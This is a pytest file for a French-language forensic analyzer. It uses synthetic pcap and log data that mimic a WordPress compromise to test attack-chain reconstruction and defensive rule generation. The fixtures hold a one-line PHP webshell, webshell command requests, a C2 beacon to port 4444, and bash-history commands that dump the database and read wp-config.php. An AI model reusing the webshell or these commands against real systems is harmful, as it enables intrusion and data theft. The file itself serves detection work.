"""Chaîne d'attaque WordPress (brute-force, webshell, exfiltration, balise, pivot) : chaque étape
doit être retrouvée, attribuée au bon rôle et donner des règles utilisables. Données synthétiques
reprenant les faiblesses constatées sur le TP Sentinelle."""
from __future__ import annotations

import os

import pytest

from forensic_analyzer.models.finding import FindingModel, ReportModel

scapy = pytest.importorskip("scapy.all")

ATTACKER, SERVER, CLIENT, LAN = "203.0.113.42", "192.0.2.10", "192.0.2.150", "192.168.10.20"


def _http(src, sport, dst, dport, payload, t):
    pkt = scapy.IP(src=src, dst=dst) / scapy.TCP(sport=sport, dport=dport, flags="PA") / scapy.Raw(payload)
    pkt.time = t
    return pkt


def _attack_pcap(path):
    pkts, t = [], 1_790_000_000.0
    # 30 tentatives sur 10 ports source réutilisés, la dernière acceptée (302 + cookie de session)
    for i in range(30):
        port = 41000 + i % 10
        pwd = "Admin2025%21" if i == 29 else f"Pass{i:04d}"
        pkts.append(_http(ATTACKER, port, SERVER, 80,
                          f"POST /wp-login.php HTTP/1.1\r\nHost: {SERVER}\r\nUser-Agent: axios/0.21.1\r\n\r\nlog=admin&pwd={pwd}".encode(), t))
        reply = (b"HTTP/1.1 302 Found\r\nLocation: /wp-admin/\r\nSet-Cookie: wordpress_logged_in_x=admin\r\n\r\n" if i == 29
                 else b"HTTP/1.1 200 OK\r\nContent-Length: 9\r\n\r\nbad login")
        pkts.append(_http(SERVER, 80, ATTACKER, port, reply, t + 0.01))
        t += 1
    pkts.append(_http(ATTACKER, 42001, SERVER, 80, b"POST /wp-admin/async-upload.php HTTP/1.1\r\nUser-Agent: axios/0.21.1\r\n\r\n"
                      b'Content-Disposition: form-data; name="async-upload"; filename="x.php"\r\n\r\n<?php system($_REQUEST["c"]); ?>', t))
    pkts.append(_http(ATTACKER, 42002, SERVER, 80, b"GET /wp-content/uploads/x.php?c=whoami HTTP/1.1\r\nUser-Agent: axios/0.21.1\r\n\r\n", t + 1))
    pkts.append(_http(ATTACKER, 42003, SERVER, 80, b"GET /wp-content/uploads/dump.sql.gz HTTP/1.1\r\nUser-Agent: axios/0.21.1\r\n\r\n", t + 2))
    pkts.append(_http(CLIENT, 50000, SERVER, 80, b"GET / HTTP/1.1\r\nUser-Agent: curl/7.88\r\n\r\n", t + 3))
    pkts.append(_http(SERVER, 51000, ATTACKER, 4444, b"GET /beacon?host=web-01 HTTP/1.1\r\n\r\n", t + 4))
    syn = scapy.IP(src=SERVER, dst=LAN) / scapy.TCP(sport=50500, dport=445, flags="S")
    syn.time = t + 5
    pkts.append(syn)
    scapy.wrpcap(str(path), pkts)
    return str(path)


@pytest.fixture
def pcap_finding(tmp_path):
    from forensic_analyzer.analyzers.pcap import PCAPAnalyzer
    return PCAPAnalyzer().analyze(_attack_pcap(tmp_path / "traffic.pcap"))


def test_pcap_reconstructs_the_attack_chain(pcap_finding):
    attack = pcap_finding.extra["http_attack"]
    assert attack["brute_force"][0]["attempts"] == 30          # ports source réutilisés : rien n'est perdu
    assert attack["brute_force"][0]["winning_credential"] == "admin / Admin2025!"
    assert attack["uploads"][0]["filename"] == "x.php" and attack["uploads"][0]["php"]
    assert [c["command"] for c in attack["webshell_commands"]] == ["whoami"]
    assert attack["exfiltration"][0]["uri"].endswith("dump.sql.gz")
    assert attack["attackers"] == [ATTACKER]
    # Une requête isolée vers un port de C2 est une balise, même sans périodicité
    assert any("4444" in b["connection"] for b in pcap_finding.extra["c2_beacons"]["beacons"])
    assert pcap_finding.extra["smb_lateral"] == [f"{SERVER} -> {LAN}:445"]


def test_pcap_reports_only_the_working_password_and_ranks_user_agents(pcap_finding):
    creds = pcap_finding.extra["credentials"]
    assert creds[0]["password"] == "Admin2025!" and len(creds) == 1   # les essais ne sont pas des identifiants
    ranked = {u["user_agent"]: u["verdict"] for u in pcap_finding.extra["http_attack"]["user_agents"]}
    assert ranked["axios/0.21.1"] == "attaquant" and ranked["curl/7.88"] == "outil automatisé"


def test_rules_target_the_attacker_not_the_victim(pcap_finding, tmp_path):
    from forensic_analyzer.output.rules_generator import DefenseRulesGenerator

    out = DefenseRulesGenerator().generate(ReportModel.from_findings([pcap_finding]), output_dir=str(tmp_path / "rules"))
    rules = open(out["suricata"]).read()
    assert f"alert ip {ATTACKER} any <> $HOME_NET" in rules
    assert "Balise C2 HTTP vers 203.0.113.42:4444" in rules and "threshold:type both" in rules
    assert f"alert ip {SERVER}" not in rules and CLIENT not in rules


_ACCESS_LOG = (
    "".join(f'{ATTACKER} - - [25/Oct/2026:06:48:{i:02d} +0000] "POST /wp-login.php HTTP/1.1" 200 20 "-" "axios/0.21.1"\n'
            for i in range(25))
    + f'{ATTACKER} - - [25/Oct/2026:07:03:00 +0000] "POST /wp-login.php HTTP/1.1" 302 0 "-" "axios/0.21.1"\n'
    + f'{CLIENT} - - [25/Oct/2026:07:04:00 +0000] "POST /wp-login.php HTTP/1.1" 200 20 "-" "Mozilla/5.0"\n'
    + f'{ATTACKER} - - [25/Oct/2026:07:05:00 +0000] "POST /wp-admin/async-upload.php HTTP/1.1" 200 120 "-" "axios/0.21.1"\n'
    + f'{ATTACKER} - - [25/Oct/2026:07:08:00 +0000] "GET /wp-content/uploads/x.php?c=whoami HTTP/1.1" 200 455 "-" "axios/0.21.1"\n'
    + f'{ATTACKER} - - [25/Oct/2026:07:21:00 +0000] "GET /wp-content/uploads/dump.sql.gz HTTP/1.1" 200 12582912 "-" "axios/0.21.1"\n'
)


def test_web_log_groups_brute_force_and_keeps_later_attack_steps(tmp_path):
    from forensic_analyzer.analyzers.log_analyzer.parsers import parse_web_access_log

    log = tmp_path / "nginx-access.log"
    log.write_text(_ACCESS_LOG)
    res = parse_web_access_log(str(log))
    assert res["brute_force"] == [{"ip": ATTACKER, "attempts": 26, "first": res["brute_force"][0]["first"],
                                   "last": res["brute_force"][0]["last"], "succeeded": True}]
    assert res["attackers"] == [ATTACKER]                       # le client légitime n'est pas un indicateur
    kinds = [e["event_type"] for e in res["events"]]
    # Les étapes après le brute-force ne sont plus évincées par les tentatives de connexion
    assert {"brute_force", "auth_success", "upload", "webshell_command", "exfiltration"} <= set(kinds)
    assert kinds.count("auth_attempt") == 0


def test_syslog_notable_events_and_year_from_mtime(tmp_path):
    from forensic_analyzer.analyzers.log_analyzer.parsers import parse_syslog_file

    log = tmp_path / "syslog"
    log.write_text("Oct 25 07:08:20 web-01 sudo:   www-data : NOT in sudoers\n"
                   "Oct 25 07:38:00 web-01 cron[1]: (*system*) RELOAD (/etc/cron.d/updater)\n"
                   f"Oct 25 07:39:02 web-01 www-data: LOGIN SUCCESS user=admin from {ATTACKER} (via php)\n")
    os.utime(log, (1_793_000_000, 1_793_000_000))   # fin octobre 2026
    res = parse_syslog_file(str(log))
    assert [n["type"] for n in res["notable"]] == ["sudo_denied", "cron_reload", "app_login"]
    assert res["notable_ips"] == [ATTACKER]
    assert all(e["timestamp"].startswith("2026-10-25") for e in res["events"])


def test_nginx_error_timestamps_are_valid_iso(tmp_path):
    from forensic_analyzer.analyzers.log_analyzer.parsers import parse_web_error_log
    from forensic_analyzer.core.timeline import parse_ts

    log = tmp_path / "nginx-error.log"
    log.write_text(f'2026/10/25 06:48:00 [error] 123#0: *1 limiting requests, excess: 10.000 by zone "login", client: {ATTACKER}\n')
    event = parse_web_error_log(str(log))["events"][0]
    assert parse_ts(event["timestamp"]) is not None and "brute-force" in event["description"]


def test_bash_history_flags_pivot_dump_and_cleartext_passwords(tmp_path):
    from forensic_analyzer.analyzers.linux.analyzer import parse_bash_history

    hist = tmp_path / ".bash_history"
    hist.write_text("cat /var/www/html/wp-config.php\nmysqldump -uwp -pwpPass2025! wordpress | gzip > dump.sql.gz\n"
                    f"curl -s http://{LAN}:445\nsmbclient -U wp%wpPass2025! //{LAN}/public\nls\n")
    res = parse_bash_history(str(hist))
    assert res["suspicious_commands"] == 4
    assert {c["password"] for c in res["cleartext_passwords"]} == {"wpPass2025!"}


def test_xml_is_not_a_webshell_and_nmap_hosts_without_status_count(tmp_path):
    from forensic_analyzer.analyzers.nmap import NmapAnalyzer
    from forensic_analyzer.analyzers.webshell import WebshellAnalyzer

    xml = tmp_path / "nmap.xml"
    xml.write_text('<?xml version="1.0"?><nmaprun scanner="nmap" args="nmap -sV 192.0.2.0/28"><host>'
                   f'<address addr="{SERVER}" addrtype="ipv4"/><ports><port protocol="tcp" portid="80">'
                   '<state state="open"/><service name="http" product="nginx" version="1.25.3"/></port></ports></host></nmaprun>')
    assert not WebshellAnalyzer().can_handle(str(xml))
    meta = NmapAnalyzer().analyze(str(xml)).metadata
    assert meta["Hôtes actifs découverts"] == "1" and "(http nginx 1.25.3)" in meta[f"Cible #1 : {SERVER}"]


def test_ioc_extraction_ranks_by_role_not_frequency(tmp_path):
    from forensic_analyzer.analyzers.ioc import IOCAnalyzer

    log = tmp_path / "nginx-access.log"
    log.write_text(_ACCESS_LOG)
    meta = IOCAnalyzer().analyze(str(log)).metadata
    assert meta["[ALERTE] IP à l'activité offensive"].startswith(ATTACKER)
    assert CLIENT in meta["Autres IP (aucune activité offensive observée)"]


def test_integrity_separates_missing_files_from_alteration(tmp_path):
    from forensic_analyzer.analyzers.integrity import IntegrityAnalyzer

    (tmp_path / "a.txt").write_text("x")
    manifest = tmp_path / "m.sha256"
    manifest.write_text(f"{'0' * 64}  ./absent.txt\n")
    assert IntegrityAnalyzer().analyze(str(manifest), phase="initiale").metadata["Verdict"].startswith("Vérification incomplète")
    manifest.write_text(f"{'0' * 64}  a.txt\n")
    assert IntegrityAnalyzer().analyze(str(manifest), phase="initiale").metadata["Verdict"].startswith("[ALERTE] Preuves altérées")


def test_identified_software_only_gets_a_hash_rule(tmp_path):
    from forensic_analyzer.output.rules_generator import DefenseRulesGenerator

    busybox = FindingModel(type="elf_analysis", file="/e/suspicious-binary",
                           metadata={"SHA-256": "a" * 64, "Identification": "BusyBox 1.38.0",
                                     "Capacité : Réseau sortant": "connect", "Capacité : Exécution de commandes": "execve"},
                           extra={"iocs": {"paths": ["/etc/motd", "/var/run/crond.reboot"]}})
    out = DefenseRulesGenerator().generate(ReportModel.from_findings([busybox]), output_dir=str(tmp_path))
    yar = open(out["yara"]).read()
    assert "FA_Known_Hashes" in yar and "rule FA_ELF_" not in yar


def test_each_analysis_gets_its_own_export_folder():
    from forensic_analyzer.utils import exports

    before = exports.export_root()
    try:
        path = exports.new_case_dir("/preuves/affaire 42/")
        assert path.startswith(os.path.join("export", "")) and path.endswith("_affaire_42")
    finally:
        exports.set_export_root(before)
